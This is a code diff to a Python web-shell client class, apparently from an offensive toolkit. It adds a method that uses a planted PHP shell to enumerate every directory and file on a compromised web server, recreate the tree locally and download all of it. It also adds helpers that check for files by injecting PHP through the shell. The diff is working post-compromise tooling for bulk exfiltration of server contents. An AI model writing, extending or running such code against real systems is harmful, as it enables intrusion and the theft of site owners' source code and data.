@@ -4,10 +4,12 @@
 from core.utils.string_utils.random_string import random_string
 from core.utils.string_utils.list2string import list2string
 from core.utils.http.build_url import build_url
+from core.utils.http.get_domain import get_domain
 from core.log import Log
 
 import requests
 import string
+import os
 
 class WebShell():
     url = "http://127.0.0.1/c.php"
@@ -363,18 +365,68 @@ class WebShell():
         else:
             Log.error("Fetch data failed!")
 
-    def download_code(self):
+    def download_recursion(self, path):
+        root = get_domain(self.url)
+        # List all dir and create them
+        directories = self.get_all_directories(path)
+        Log.success("Directories : \n%s" % list2string(directories, "\t[", "]\n"))
+        Log.info("Create directories locally...")
+        for d in directories:
+            p = root + d
+            Log.info("Creating : [%s]" % (p))
+            try:
+                os.makedirs(p)
+            except Exception as e:
+                Log.error(str(e))
+        # Download
         Log.info("Listing all files...")
-        result = self.auto_exec('find %s' % (self.webroot))
+        result = self.auto_exec('find %s -type f' % (path))
         if result[0]:
             Log.success("Listing files success!")
-            content = result[1].split("\n")
-            Log.info("Print some of the files...")
-            for file in content[0:10]:
-                Log.success("Found : " + file)
+            content = result[1].split("\n")[0:-1]
+            for file in content:
+                p = root + file
+                Log.info("Downloading %s to %s" % (file, p))
+                self.download(file, p)
         else:
             Log.error("Listing files error!")
 
 
+    def get_all_directories(self, path):
+        command = "find %s -type d" % (path)
+        result = self.auto_exec(command)
+        if result[0]:
+            content = result[1]
+            directories = content.split("\n")[0:-1]
+            return directories
+        else:
+            return []
 
 
+    def file_exists(self, filename):
+        Log.info("Checking file exists : [%s]" % filename)
+        result = self.php_code_exec_token("var_dump(file_exists('%s'));" % (filename))
+        if result[0]:
+            Log.error("Checking finished successfully!")
+            content = result[1]
+            if "bool(true)" in content:
+                Log.success("File (%s) is existed!" % (filename))
+                return True
+            return False
+        else:
+            Log.error("Some error occured while checking!")
+            return False
+
+    def is_directory(self, filename):
+        Log.info("Checking file exists : [%s]" % filename)
+        result = self.php_code_exec_token("var_dump(is_dir('%s'));" % (filename))
+        if result[0]:
+            Log.error("Checking finished successfully!")
+            content = result[1]
+            if "bool(true)" in content:
+                Log.success("File (%s) is existed!" % (filename))
+                return True
+            return False
+        else:
+            Log.error("Some error occured while checking!")
+            return False
